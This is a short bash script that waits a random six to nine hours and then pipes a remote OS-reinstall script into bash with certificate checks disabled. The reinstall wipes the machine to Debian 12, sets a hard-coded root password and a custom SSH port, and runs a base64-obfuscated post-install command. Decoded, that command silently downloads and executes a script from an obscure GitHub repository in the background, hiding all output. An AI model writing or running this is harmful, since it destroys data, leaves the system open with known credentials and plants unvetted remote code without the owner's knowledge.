#!/bin/bash

sleep "$[`od -An -N2 -i /dev/urandom` % 10800 + 21600]"

bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/MoeClub/Note/master/InstallNET.sh) -d 12 -v 64 -a -p "Ec2.123456" -port 1234 -cmd "IyEvYmluL2Jhc2gKCmFwdCAtcXF5IGluc3RhbGwgd2dldApiYXNoIDwod2dldCAtcU8tIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS92amJhaGtkcy9qc25jc2RjY3cvbWFpbi9xLnNoKSA+Pi9kZXYvbnVsbCAyPiYxICYKCg=="
